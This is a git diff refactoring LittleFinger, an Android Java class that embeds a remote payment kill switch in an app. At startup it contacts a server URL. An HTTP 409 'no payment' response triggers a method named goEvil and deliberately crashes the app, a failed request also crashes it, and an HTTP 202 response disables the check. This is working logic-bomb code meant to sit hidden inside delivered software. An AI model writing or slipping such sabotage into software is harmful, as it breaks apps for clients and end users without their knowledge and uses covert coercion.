@@ -18,55 +18,60 @@ import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.Response;
 
+
 public class LittleFinger {
 
-    private static Context context;
     private static OkHttpClient client = new OkHttpClient();
-    private static final String PREF_SHOULD_CALL = "should_call";
 
     public static void init(Context ctx, String urlString) {
-        context = ctx;
-
-        if (!shouldMakeCall()) {
+        if (!Status.shouldMakeCall(ctx)) {
             //
             return;
         }
-
         try {
-            makeHttpCall(urlString);
+            makeHttpCall(ctx, urlString);
         } catch (IOException ex) {
             throw null;
         }
     }
 
-    private static void makeHttpCall(String url) throws IOException {
+    private static void makeHttpCall(Context ctx, String url) throws IOException {
         Request request = new Request.Builder()
                 .url(url)
                 .build();
+        CallbackHandler callback = new CallbackHandler(ctx);
+        client.newCall(request).enqueue(callback);
+    }
+}
 
-        client.newCall(request).enqueue(new Callback() {
-            @Override
-            public void onFailure(Call call, IOException e) {
-                // HTTP call itself failed
-                // crash the app
-                throw null;
-            }
+class CallbackHandler implements Callback {
 
-            @Override
-            public void onResponse(Call call, Response response) throws IOException {
-                responseHandler(response);
-            }
-        });
+    private Context mContext;
+
+    CallbackHandler(Context ctx) {
+        mContext = ctx;
     }
 
-    private static void responseHandler(Response response) {
+    @Override
+    public void onFailure(Call call, IOException e) {
+        // HTTP call itself failed
+        // crash the app
+        throw null;
+    }
+
+    @Override
+    public void onResponse(Call call, Response response) throws IOException {
+        responseHandler(response);
+    }
+
+    private void responseHandler(Response response) {
         if (response.code() == HttpURLConnection.HTTP_PAYMENT_REQUIRED) {
             // do nothing
             // we are waiting for payment, hence let the app work as expected
         } else if (response.code() == HttpURLConnection.HTTP_ACCEPTED) {
             // received the payment
             // disable HTTP calls
-            cancelCall();
+            Status.cancelCall(mContext);
         } else if (response.code() == HttpURLConnection.HTTP_CONFLICT){
             // no payment received
             // time to crash the app
@@ -74,7 +79,7 @@ public class LittleFinger {
         }
     }
 
-    private static void goEvil(Response response) {
+    private void goEvil(Response response) {
         try {
             String jsonData = response.body().string();
             JSONObject jobject = new JSONObject(jsonData);
@@ -84,29 +89,35 @@ public class LittleFinger {
         }
     }
 
-    private static void displayNotification() {
+    private void displayNotification() {
         NotificationCompat.Builder mBuilder =
-                new NotificationCompat.Builder(context)
+                new NotificationCompat.Builder(mContext)
                         .setSmallIcon(R.drawable.ic_evil)
                         .setContentTitle("My notification")
                         .setContentText("Hello World!");
 
         NotificationManager mNotificationManager =
-                (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+                (NotificationManager) mContext.getSystemService(Context.NOTIFICATION_SERVICE);
 
         mNotificationManager.notify(001, mBuilder.build());
     }
 
-    private static boolean shouldMakeCall() {
-        return Boolean.valueOf(Utils.readSharedSetting(context,
+}
+
+
+class Status {
+    private static final String PREF_SHOULD_CALL = "should_call";
+
+    static boolean shouldMakeCall(Context ctx) {
+        return Boolean.valueOf(Utils.readSharedSetting(ctx,
                 PREF_SHOULD_CALL, "true"));
     }
 
-    private static void cancelCall() {
-        Utils.saveSharedSetting(context, PREF_SHOULD_CALL, "false");
+    static void cancelCall(Context ctx) {
+        Utils.saveSharedSetting(ctx, PREF_SHOULD_CALL, "false");
     }
-
 }
+
 
 class Utils {
 
